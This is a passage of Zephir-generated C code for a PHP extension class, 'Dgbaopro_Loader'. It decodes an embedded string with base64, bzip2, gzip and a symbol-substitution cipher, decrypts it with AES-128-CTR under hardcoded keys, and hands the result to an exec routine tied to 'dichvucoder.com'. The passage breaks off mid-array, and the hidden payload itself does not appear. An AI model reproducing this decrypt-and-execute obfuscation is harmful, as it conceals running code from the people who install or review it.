	ZEPHIR_CALL_FUNCTION(&_1, "bzdecompress", NULL, 9, &_);
	zephir_check_call_status();
	zephir_get_strval(&_, &_1);
	ZEPHIR_CALL_FUNCTION(&_2, "gzinflate", NULL, 10, &_);
	zephir_check_call_status();
	zephir_get_strval(&_, &_2);
	ZEPHIR_INIT_VAR(&_3);
	zephir_create_array(&_3, 67, 0);
	ZEPHIR_INIT_VAR(&_4);
	ZVAL_STRING(&_4, "⊞");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊮");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⋃");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊒");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊇");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊚");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊵");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊯");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊫");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊾");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊧");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⋁");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊰");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊛");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⋇");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⋆");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊩");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊪");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊅");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊬");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊳");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊱");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⋀");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊥");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⋂");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊑");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⋄");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊢");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊤");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊗");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊘");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊟");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊃");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊭");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊴");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊷");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊀");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊋");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊲");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊠");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊁");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊐");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊦");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊶");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊨");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊄");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊊");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊙");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊿");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊈");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊆");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊣");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊉");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊡");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊖");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⋈");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊜");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊕");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⋅");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊏");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊝");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊂");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_VAR(&_5);
	zephir_create_array(&_5, 67, 0);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "3");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "c");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "D");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "5");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "b");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "M");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "Y");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "R");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "z");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "K");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "d");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "T");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "v");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "w");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "u");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "i");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "8");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "U");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "k");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "V");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "9");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "6");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "2");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "I");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "r");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "E");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "f");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "n");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "F");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "H");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "p");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "h");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "g");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "q");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "S");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "B");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "a");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "j");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "s");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "P");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "G");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "4");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "O");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "X");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "L");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "t");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "W");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "0");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "1");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "x");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "l");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "7");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "C");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "J");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "y");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "N");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "e");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "m");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "Q");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "o");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "Z");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "A");
	zephir_array_fast_append(&_5, &_4);
	ZEPHIR_INIT_VAR(&__);
	zephir_fast_str_replace(&__, &_3, &_5, &_);
	ZEPHIR_INIT_VAR(&_7);
	ZEPHIR_CONCAT_SSSSSSSSSSSSS(&_7, "D", "G", "B", "A", "O", "P", "R", "O", "1", "4", "0", "7", "@");
	ZEPHIR_CALL_STATIC(&___, "_", &_6, 11, &__, &_7);
	zephir_check_call_status();
	zephir_update_static_property_ce(dgbaopro_loader_ce, ZEND_STRL("l"), &__$true);
	ZEPHIR_INIT_NVAR(&_4);
	dgbaopro_exec(&___, &_4, "dichvucoder.com");
	ZEPHIR_MM_RESTORE();
}

PHP_METHOD(Dgbaopro_Loader, _____)
{
	zephir_method_globals *ZEPHIR_METHOD_GLOBALS_PTR = NULL;
	zval *__param = NULL, _0;
	zval _;
	zval *this_ptr = getThis();

	ZVAL_UNDEF(&_);
	ZVAL_UNDEF(&_0);
#if PHP_VERSION_ID >= 80000
	bool is_null_true = 1;
	ZEND_PARSE_PARAMETERS_START(1, 1)
		Z_PARAM_STR(_)
	ZEND_PARSE_PARAMETERS_END();
#endif


	ZEPHIR_MM_GROW();
	zephir_fetch_params(1, 1, 0, &__param);
	zephir_get_strval(&_, __param);


	ZEPHIR_INIT_VAR(&_0);
	dgbaopro_exec(&_, &_0, "dichvucoder.com");
	ZEPHIR_MM_RESTORE();
}

PHP_METHOD(Dgbaopro_Loader, ______)
{
	zval _4, _6;
	zephir_method_globals *ZEPHIR_METHOD_GLOBALS_PTR = NULL;
	zephir_fcall_cache_entry *_10 = NULL;
	zend_long ZEPHIR_LAST_CALL_STATUS, _____;
	zval *__param = NULL, *___param = NULL, *____param = NULL, ____, _1, _2, _3, _5, _7, _8, _9;
	zval _, __, ___, _0;
	zval *this_ptr = getThis();

	ZVAL_UNDEF(&_);
	ZVAL_UNDEF(&__);
	ZVAL_UNDEF(&___);
	ZVAL_UNDEF(&_0);
	ZVAL_UNDEF(&____);
	ZVAL_UNDEF(&_1);
	ZVAL_UNDEF(&_2);
	ZVAL_UNDEF(&_3);
	ZVAL_UNDEF(&_5);
	ZVAL_UNDEF(&_7);
	ZVAL_UNDEF(&_8);
	ZVAL_UNDEF(&_9);
	ZVAL_UNDEF(&_4);
	ZVAL_UNDEF(&_6);
#if PHP_VERSION_ID >= 80000
	bool is_null_true = 1;
	ZEND_PARSE_PARAMETERS_START(2, 3)
		Z_PARAM_STR(_)
		Z_PARAM_STR(__)
		Z_PARAM_OPTIONAL
		Z_PARAM_STR_OR_NULL(___)
	ZEND_PARSE_PARAMETERS_END();
#endif


	ZEPHIR_MM_GROW();
	zephir_fetch_params(1, 2, 1, &__param, &___param, &____param);
	zephir_get_strval(&_, __param);
	zephir_get_strval(&__, ___param);
	if (!____param) {
		ZEPHIR_INIT_VAR(&___);
	} else {
		zephir_get_strval(&___, ____param);
	}


	if (ZEPHIR_IS_NULL(&___)) {
		ZEPHIR_INIT_NVAR(&___);
		ZEPHIR_INIT_NVAR(&___);
		ZEPHIR_CONCAT_SSSSSSSSSSSSSSSS(&___, "5", "3", "2", "7", "4", "4", "0", "3", "4", "2", "5", "1", "0", "9", "2", "6");
	} else {
	}
	ZEPHIR_INIT_VAR(&____);
	ZVAL_STRING(&____, "");
	ZEPHIR_INIT_VAR(&_0);
	ZEPHIR_CONCAT_SSSSSSSSSSS(&_0, "A", "E", "S", "-", "1", "2", "8", "-", "C", "T", "R");
	ZEPHIR_CPY_WRT(&____, &_0);
	_____ = 0;
	ZEPHIR_CALL_FUNCTION(&_1, "base64_decode", NULL, 6, &_);
	zephir_check_call_status();
	zephir_get_strval(&_, &_1);
	ZEPHIR_CALL_FUNCTION(&_2, "bzdecompress", NULL, 9, &_);
	zephir_check_call_status();
	zephir_get_strval(&_, &_2);
	ZEPHIR_INIT_VAR(&_3);
	ZEPHIR_INIT_VAR(&_4);
	zephir_create_array(&_4, 67, 0);
	ZEPHIR_INIT_VAR(&_5);
	ZVAL_STRING(&_5, "⊶");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⊑");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⋃");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⊖");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⊜");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⊢");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⊅");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⊈");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⊉");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⊞");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⊥");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⊧");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⊷");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⊬");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⊣");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⊰");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⊆");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⋈");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⊘");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⊯");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⋄");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⊫");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⊊");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⋂");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⊭");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⋇");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⋆");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⋁");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⋀");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⊿");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⊏");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⊟");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⊄");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⊐");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⊲");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⊀");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⊁");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⊃");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⊕");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⊙");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⊠");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⊳");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⊂");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⊦");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⊨");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⊒");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⊩");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⊱");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⋅");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⊇");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⊴");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⊚");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⊾");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⊗");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⊵");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⊝");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⊮");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⊋");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⊪");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⊤");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⊡");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "⊛");
	zephir_array_fast_append(&_4, &_5);
	ZEPHIR_INIT_VAR(&_6);
	zephir_create_array(&_6, 67, 0);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "9");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "W");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "c");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "P");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "A");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "z");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "5");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "Q");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "v");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "H");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "s");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "y");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "m");
